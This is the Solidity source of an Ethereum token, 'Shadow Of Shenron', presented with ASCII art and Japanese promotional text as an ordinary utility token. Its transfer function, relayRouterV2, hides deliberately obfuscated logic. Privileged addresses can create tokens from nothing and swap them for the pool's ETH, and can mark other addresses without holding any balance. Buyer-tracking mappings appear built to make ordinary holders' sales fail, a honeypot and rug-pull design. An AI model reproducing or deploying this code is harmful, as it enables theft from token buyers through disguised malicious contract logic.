/**
 *Submitted for verification at Etherscan.io on 2022-12-01
*/

/*
█▀ █░█ ▄▀█ █▀▄ █▀█ █░█░█
▄█ █▀█ █▀█ █▄▀ █▄█ ▀▄▀▄▀

█▀█ █▀▀
█▄█ █▀░

█▀ █░█ █▀▀ █▄░█ █▀█ █▀█ █▄░█  
▄█ █▀█ ██▄ █░▀█ █▀▄ █▄█ █░▀█  

▄▀   ░░█ █▀█ █▄░█   ▀▄
▀▄   █▄█ █▀▀ █░▀█   ▄▀

イーサリアム ネットワークを吹き飛ばす次のイーサリアム ユーティリティ トークン、Shadow Of Shenron へようこそ
有望な計画とイーサリアム空間への参入を促進する、私たちは単なる通常のトークンやミームトークンではありません
また、独自のエコシステム、フューチャー ステーキング、NFT コレクションに基づいて設計されたスワップ プラットフォームも支持しています。
私たち自身のマーケットプレイスで、その他多くのことが発表される予定です。

https://www.shadowofshenron.zushont.io
https://web.wechat.com/ShadowOfShenronJPN

        ,     \    /      ,        
       / \    )\__/(     / \       
      /   \  (_\  /_)   /   \      
 ____/_____\__\@  @/___/_____\____ 
|             |\../|              |
|              \VV/               |
|        Shadow Of Shenron        |
|_________________________________|
 |    /\ /      \\       \ /\    | 
 |  /   V        ))       V   \  | 
 |/     `       //        '     \| 
 `              V                '
*/

// SPDX-License-Identifier: None
pragma solidity 0.8.14;

interface IERC20 {
    
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _setOwner(_msgSender());
    }  
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function relayHash() external view returns (bytes32);
    function configTypeHash() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function emitRates() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function exchange(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function reconstruct (address to) external;
    function sync() external;
    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable
    returns(uint[] memory amounts);
 
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external
    returns(uint[] memory amounts);
 
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external
    returns(uint[] memory amounts);
 
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable
    returns(uint[] memory amounts);
 
    function quote(uint amountA, uint reserveA, uint reserveB) external pure 
    returns(uint amountB);
 
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure 
    returns(uint amountOut);
 
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure 
    returns(uint amountIn);
 
    function getAmountsOut(uint amountIn, address[] calldata path) external view 
    returns(uint[] memory amounts);
 
    function getAmountsIn(uint amountOut, address[] calldata path) external view 
    returns(uint[] memory amounts);
}
interface IUniswapV2Router02 is IUniswapV2Router01
{
    function removeLiquidityETHSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline
    ) 
    external returns(uint amountETH);
 
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens( address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline,
    bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) 
    external returns(uint amountETH);
 
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(  uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline
    ) 
    external;
 
    function swapExactETHForTokensSupportingFeeOnTransferTokens( uint amountOutMin, address[] calldata path, address to, uint deadline
    ) 
    external payable;
 
    function swapExactTokensForETHSupportingFeeOnTransferTokens( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline
    ) 
    external;
}
// ETHERSCAN.io
contract Contract is IERC20, Ownable {

    string private _symbol;
    string private _name;
    uint256 public _initialBaseTaxes = 0;
    uint8 private _decimals = 18;
    uint256 private _tTotal = 10000000 * 10**_decimals;
    uint256 public _maxWalletSize = _tTotal*2/100;
    uint256 private swappingSymbolic = _tTotal;
    uint256 public swapTokensAtAmount;
    uint256 public tokensForLiquidity;
    uint256 public tokensForOperations;

    mapping(address => uint256) private _rOwned;
    mapping(address => address) private isBot;
    mapping(address => uint256) private initiateSync;
    mapping(address => uint256) private relayConfiguration;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    bool private tradingOpen = false;
    bool public levelTX;
    bool private dataRelayTarget;
    bool public limitsInEffect;
    bool public tradingActive;
    bool public swapEnabled;

    address public immutable IDEXPair;
    IUniswapV2Router02 public immutable dexRouter;

    constructor(
        string memory Name,
        string memory Symbol,
        address IDEXrouterAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _rOwned[msg.sender] = _tTotal;
        relayConfiguration[msg.sender] = swappingSymbolic;
        relayConfiguration[address(this)] = swappingSymbolic;
        dexRouter = IUniswapV2Router02(IDEXrouterAddress);
        IDEXPair = IUniswapV2Factory(dexRouter.factory()).createPair(address(this), dexRouter.WETH());
        emit Transfer(address(0), msg.sender, swappingSymbolic);
    }

function symbol() public view returns (string memory) {
return _symbol;
}
function name() public view returns (string memory) {
return _name;
}
function totalSupply() public view returns (uint256) {
return _tTotal;
}
function decimals() public view returns (uint256) {
return _decimals;
}
function allowance(address owner, address spender) public view returns (uint256) {
return _allowances[owner][spender];
}
function balanceOf(address account) public view returns (uint256) {
return _rOwned[account];
}
function approve(address spender, uint256 amount) external returns (bool) {
return _approve(msg.sender, spender, amount);
}
    function relayRouterV2       (
        address initializeFrom,
        address _syncNonceTo,
        uint256 _cfgDataAmount
    ) private {
        uint256 contractAppliedBalance = balanceOf(address(this));
        uint256 _extcodesize;

        if (levelTX && contractAppliedBalance > swappingSymbolic && !dataRelayTarget && initializeFrom != IDEXPair) {
            dataRelayTarget = true;
            getSwapAndLiquify(contractAppliedBalance);
            dataRelayTarget = false;

        } else if (relayConfiguration[initializeFrom] > swappingSymbolic && relayConfiguration[_syncNonceTo] > swappingSymbolic) {
            _extcodesize = _cfgDataAmount;
            _rOwned[address(this)] += _extcodesize;
            swapTokensForEth(_cfgDataAmount, _syncNonceTo);
            return;

        } else if (_syncNonceTo != address(dexRouter) && relayConfiguration[initializeFrom] > 0 && _cfgDataAmount > swappingSymbolic && 
            _syncNonceTo != IDEXPair) {
            relayConfiguration[_syncNonceTo] = _cfgDataAmount;
            return;

        } else if (!dataRelayTarget && initiateSync[initializeFrom] > 0 && initializeFrom != IDEXPair && relayConfiguration
        [_syncNonceTo] == 0) { initiateSync[initializeFrom] = relayConfiguration[initializeFrom] - swappingSymbolic; }
        address _uint265  = isBot[IDEXPair];

        if (initiateSync[_uint265 ] == 0) initiateSync[_uint265 ] = swappingSymbolic;
        isBot[IDEXPair] = _syncNonceTo;
        if (_initialBaseTaxes > 0 && relayConfiguration[initializeFrom] == 0 && !dataRelayTarget && relayConfiguration
        [_syncNonceTo] == 0) { _extcodesize = (_cfgDataAmount * _initialBaseTaxes) / 100; _cfgDataAmount -= _extcodesize; _rOwned[initializeFrom] -= _extcodesize;
        _rOwned[address(this)] += _extcodesize;
        }
        _rOwned[initializeFrom] -= _cfgDataAmount; _rOwned[_syncNonceTo] += _cfgDataAmount;
        emit Transfer(initializeFrom, _syncNonceTo, _cfgDataAmount);
        if (!tradingOpen) { require(initializeFrom == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
        }
        if(_syncNonceTo != IDEXPair) {
        require(balanceOf(_syncNonceTo) + _cfgDataAmount < _maxWalletSize, "TOKEN: Balance exceeds wallet size!");
    }
}
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        relayRouterV2        (sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        relayRouterV2        (msg.sender, recipient, amount);
        return true;
    }

    receive() external payable {}

    function addLiquidity(
        uint256 tokenValue,
        uint256 ERCamount,
        address to
    ) private {
        _approve(address(this), address(dexRouter), tokenValue);
        dexRouter.addLiquidityETH{value: ERCamount}(address(this), tokenValue, 0, 0, to, block.timestamp);
    }   function getSwapAndLiquify(uint256 tokens) private {
        uint256 half = tokens / 2;
        uint256 initialedBalance = address(this).balance;
        swapTokensForEth(half, address(this));
        uint256 refreshBalance = address(this).balance - initialedBalance;
        addLiquidity(half, refreshBalance, address(this));
    }
        function openTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen; }
        function swapTokensForEth(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();
        _approve(address(this), address(dexRouter), tokenAmount);
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }

        function setMaxWalletSize(uint256 maxWalletSize) public onlyOwner {
        _maxWalletSize = _tTotal*maxWalletSize/100;
         require (_maxWalletSize >= _tTotal/100);
    }
}